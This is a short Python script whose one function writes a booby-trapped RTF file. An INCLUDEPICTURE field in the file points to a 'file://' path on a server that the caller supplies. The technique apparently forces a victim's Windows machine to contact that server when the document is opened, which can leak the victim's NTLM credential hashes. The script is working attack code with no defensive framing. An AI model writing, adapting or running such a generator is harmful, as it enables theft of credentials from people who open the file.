#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_rtf(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://"""
        + server
        + """/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}"""
    )
    file.close()
    print("Created: " + filename + " (OPEN)")
